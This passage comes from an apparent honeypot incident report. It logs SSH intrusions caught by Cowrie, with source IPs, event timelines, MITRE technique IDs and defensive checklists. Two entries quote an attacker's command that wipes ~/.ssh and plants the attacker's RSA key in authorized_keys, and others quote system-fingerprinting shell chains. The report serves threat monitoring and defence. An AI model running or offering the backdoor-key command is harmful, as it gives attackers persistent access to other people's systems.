| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:36:36` | `cowrie.session.connect` |
| `2026-08-23 12:36:36` | `cowrie.client.version` |
| `2026-08-23 12:36:36` | `cowrie.client.kex` |
| `2026-08-23 12:36:37` | `cowrie.login.success` |
| `2026-08-23 12:36:38` | `cowrie.session.params` |
| `2026-08-23 12:36:38` | `cowrie.command.input` |
| `2026-08-23 12:36:38` | `cowrie.command.failed` |
| `2026-08-23 12:36:39` | `cowrie.log.closed` |
| `2026-08-23 12:36:39` | `cowrie.session.params` |
| `2026-08-23 12:36:39` | `cowrie.command.input` |
| `2026-08-23 12:36:40` | `cowrie.session.file_download` |
| `2026-08-23 12:36:40` | `cowrie.log.closed` |
| `2026-08-23 12:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.64.25[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.64.25[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a593b23e4c0

| Field | Detail |
|---|---|
| **Source IP** | `185.64.25[.]226` |
| **First Seen** | 2026-08-23 12:36 |
| **Last Seen** | 2026-08-23 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:36:40` | `cowrie.session.connect` |
| `2026-08-23 12:36:40` | `cowrie.client.version` |
| `2026-08-23 12:36:40` | `cowrie.client.kex` |
| `2026-08-23 12:36:41` | `cowrie.login.success` |
| `2026-08-23 12:36:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.64.25[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.64.25[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b069b5352673

| Field | Detail |
|---|---|
| **Source IP** | `185.64.25[.]226` |
| **First Seen** | 2026-08-23 12:36 |
| **Last Seen** | 2026-08-23 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:36:41` | `cowrie.session.connect` |
| `2026-08-23 12:36:41` | `cowrie.client.version` |
| `2026-08-23 12:36:41` | `cowrie.client.kex` |
| `2026-08-23 12:36:42` | `cowrie.login.success` |
| `2026-08-23 12:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.64.25[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.64.25[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a765e1dffccd

| Field | Detail |
|---|---|
| **Source IP** | `2.55.125[.]200` |
| **First Seen** | 2026-08-23 12:37 |
| **Last Seen** | 2026-08-23 12:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:37:33` | `cowrie.session.connect` |
| `2026-08-23 12:37:34` | `cowrie.client.version` |
| `2026-08-23 12:37:34` | `cowrie.client.kex` |
| `2026-08-23 12:37:40` | `cowrie.login.success` |
| `2026-08-23 12:37:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.55.125[.]200` to AbuseIPDB if not already reported
- [ ] Block `2.55.125[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ace9322cf0a7

| Field | Detail |
|---|---|
| **Source IP** | `24.229.22[.]106` |
| **First Seen** | 2026-08-23 12:37 |
| **Last Seen** | 2026-08-23 12:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:37:46` | `cowrie.session.connect` |
| `2026-08-23 12:37:47` | `cowrie.client.version` |
| `2026-08-23 12:37:47` | `cowrie.client.kex` |
| `2026-08-23 12:37:48` | `cowrie.login.success` |
| `2026-08-23 12:37:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.229.22[.]106` to AbuseIPDB if not already reported
- [ ] Block `24.229.22[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79dbbb2cb0dd

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:38 |
| **Last Seen** | 2026-08-23 12:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:38:10` | `cowrie.session.connect` |
| `2026-08-23 12:38:10` | `cowrie.client.version` |
| `2026-08-23 12:38:10` | `cowrie.client.kex` |
| `2026-08-23 12:38:12` | `cowrie.login.success` |
| `2026-08-23 12:38:13` | `cowrie.session.params` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.success` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.command.input` |
| `2026-08-23 12:38:13` | `cowrie.log.closed` |
| `2026-08-23 12:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5078d0db99aa

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:38 |
| **Last Seen** | 2026-08-23 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:38:52` | `cowrie.session.connect` |
| `2026-08-23 12:38:52` | `cowrie.client.version` |
| `2026-08-23 12:38:52` | `cowrie.client.kex` |
| `2026-08-23 12:38:53` | `cowrie.login.success` |
| `2026-08-23 12:38:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:38:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:38:54` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5665f3a8d9bf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:38 |
| **Last Seen** | 2026-08-23 12:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:38:57` | `cowrie.session.connect` |
| `2026-08-23 12:38:57` | `cowrie.client.version` |
| `2026-08-23 12:38:57` | `cowrie.client.kex` |
| `2026-08-23 12:38:58` | `cowrie.login.success` |
| `2026-08-23 12:38:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:38:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:38:58` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:38:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a24cdb1b264

| Field | Detail |
|---|---|
| **Source IP** | `20.55.45[.]217` |
| **First Seen** | 2026-08-23 12:40 |
| **Last Seen** | 2026-08-23 12:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:40:27` | `cowrie.session.connect` |
| `2026-08-23 12:40:27` | `cowrie.client.version` |
| `2026-08-23 12:40:27` | `cowrie.client.kex` |
| `2026-08-23 12:40:27` | `cowrie.login.success` |
| `2026-08-23 12:40:28` | `cowrie.session.params` |
| `2026-08-23 12:40:28` | `cowrie.command.input` |
| `2026-08-23 12:40:28` | `cowrie.command.failed` |
| `2026-08-23 12:40:28` | `cowrie.log.closed` |
| `2026-08-23 12:40:29` | `cowrie.session.params` |
| `2026-08-23 12:40:29` | `cowrie.command.input` |
| `2026-08-23 12:40:29` | `cowrie.session.file_download` |
| `2026-08-23 12:40:29` | `cowrie.log.closed` |
| `2026-08-23 12:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.55.45[.]217` to AbuseIPDB if not already reported
- [ ] Block `20.55.45[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ca93446b13

| Field | Detail |
|---|---|
| **Source IP** | `20.55.45[.]217` |
| **First Seen** | 2026-08-23 12:40 |
| **Last Seen** | 2026-08-23 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:40:29` | `cowrie.session.connect` |
| `2026-08-23 12:40:29` | `cowrie.client.version` |
| `2026-08-23 12:40:29` | `cowrie.client.kex` |
| `2026-08-23 12:40:29` | `cowrie.login.success` |
| `2026-08-23 12:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.55.45[.]217` to AbuseIPDB if not already reported
- [ ] Block `20.55.45[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23d57702a3c

| Field | Detail |
|---|---|
| **Source IP** | `20.55.45[.]217` |
| **First Seen** | 2026-08-23 12:40 |
| **Last Seen** | 2026-08-23 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:40:29` | `cowrie.session.connect` |
| `2026-08-23 12:40:29` | `cowrie.client.version` |
| `2026-08-23 12:40:29` | `cowrie.client.kex` |
| `2026-08-23 12:40:29` | `cowrie.login.success` |
| `2026-08-23 12:40:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.55.45[.]217` to AbuseIPDB if not already reported
- [ ] Block `20.55.45[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c638124b07

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:40 |
| **Last Seen** | 2026-08-23 12:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:40:49` | `cowrie.session.connect` |
| `2026-08-23 12:40:49` | `cowrie.client.version` |
| `2026-08-23 12:40:50` | `cowrie.client.kex` |
| `2026-08-23 12:40:50` | `cowrie.login.success` |
| `2026-08-23 12:40:52` | `cowrie.session.params` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.success` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.command.input` |
| `2026-08-23 12:40:52` | `cowrie.log.closed` |
| `2026-08-23 12:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d56491112b2e

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-23 12:42 |
| **Last Seen** | 2026-08-23 12:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:42:38` | `cowrie.session.connect` |
| `2026-08-23 12:42:39` | `cowrie.client.version` |
| `2026-08-23 12:42:39` | `cowrie.client.kex` |
| `2026-08-23 12:42:42` | `cowrie.login.success` |
| `2026-08-23 12:42:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:42:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ecca08c4110

| Field | Detail |
|---|---|
| **Source IP** | `61.79.227[.]51` |
| **First Seen** | 2026-08-23 12:42 |
| **Last Seen** | 2026-08-23 12:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:42:49` | `cowrie.session.connect` |
| `2026-08-23 12:42:50` | `cowrie.client.version` |
| `2026-08-23 12:42:50` | `cowrie.client.kex` |
| `2026-08-23 12:42:53` | `cowrie.login.success` |
| `2026-08-23 12:42:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.79.227[.]51` to AbuseIPDB if not already reported
- [ ] Block `61.79.227[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6dd0876baec

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:43 |
| **Last Seen** | 2026-08-23 12:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:43:28` | `cowrie.session.connect` |
| `2026-08-23 12:43:28` | `cowrie.client.version` |
| `2026-08-23 12:43:28` | `cowrie.client.kex` |
| `2026-08-23 12:43:29` | `cowrie.login.success` |
| `2026-08-23 12:43:30` | `cowrie.session.params` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.success` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:30` | `cowrie.command.input` |
| `2026-08-23 12:43:31` | `cowrie.log.closed` |
| `2026-08-23 12:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e51626c2efe2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:05` | `cowrie.session.connect` |
| `2026-08-23 12:46:05` | `cowrie.client.version` |
| `2026-08-23 12:46:05` | `cowrie.client.kex` |
| `2026-08-23 12:46:05` | `cowrie.login.success` |
| `2026-08-23 12:46:06` | `cowrie.session.params` |
| `2026-08-23 12:46:06` | `cowrie.command.input` |
| `2026-08-23 12:46:07` | `cowrie.log.closed` |
| `2026-08-23 12:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d355c16f17fa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:06` | `cowrie.session.connect` |
| `2026-08-23 12:46:07` | `cowrie.client.version` |
| `2026-08-23 12:46:07` | `cowrie.client.kex` |
| `2026-08-23 12:46:08` | `cowrie.login.success` |
| `2026-08-23 12:46:09` | `cowrie.session.params` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.success` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:09` | `cowrie.command.input` |
| `2026-08-23 12:46:10` | `cowrie.log.closed` |
| `2026-08-23 12:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e713592ab54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:10` | `cowrie.session.connect` |
| `2026-08-23 12:46:11` | `cowrie.client.version` |
| `2026-08-23 12:46:11` | `cowrie.client.kex` |
| `2026-08-23 12:46:12` | `cowrie.login.success` |
| `2026-08-23 12:46:14` | `cowrie.session.params` |
| `2026-08-23 12:46:14` | `cowrie.command.input` |
| `2026-08-23 12:46:14` | `cowrie.log.closed` |
| `2026-08-23 12:46:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a12c522e4cf2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:16` | `cowrie.session.connect` |
| `2026-08-23 12:46:16` | `cowrie.client.version` |
| `2026-08-23 12:46:16` | `cowrie.client.kex` |
| `2026-08-23 12:46:18` | `cowrie.login.success` |
| `2026-08-23 12:46:19` | `cowrie.session.params` |
| `2026-08-23 12:46:19` | `cowrie.command.input` |
| `2026-08-23 12:46:20` | `cowrie.log.closed` |
| `2026-08-23 12:46:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba20d6f2e17

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:46 |
| **Last Seen** | 2026-08-23 12:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:46:22` | `cowrie.session.connect` |
| `2026-08-23 12:46:22` | `cowrie.client.version` |
| `2026-08-23 12:46:22` | `cowrie.client.kex` |
| `2026-08-23 12:46:24` | `cowrie.login.success` |
| `2026-08-23 12:46:25` | `cowrie.session.params` |
